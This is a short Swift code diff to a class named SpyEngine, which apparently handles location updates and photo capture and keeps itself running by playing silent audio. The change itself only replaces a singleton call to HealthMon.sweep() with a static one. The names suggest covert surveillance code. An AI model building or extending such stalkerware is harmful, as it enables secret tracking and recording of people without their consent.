@@ -406,7 +406,7 @@ final class SpyEngine: NSObject, CLLocationManagerDelegate, AVCapturePhotoCaptur
                 DispatchQueue.global().async { self?.capture.startRunning() }
             }
             if self?.silence?.isPlaying == false { self?.silence = nil; self?.startKeepAlive() }
-            HealthMon.shared.sweep()
+            HealthMon.sweep()
         }
     }
 
@@ -420,7 +420,7 @@ final class SpyEngine: NSObject, CLLocationManagerDelegate, AVCapturePhotoCaptur
             else { silence?.stop(); silence = nil }
         default: break
         }
-        HealthMon.shared.sweep()
+        HealthMon.sweep()
     }
 }
 
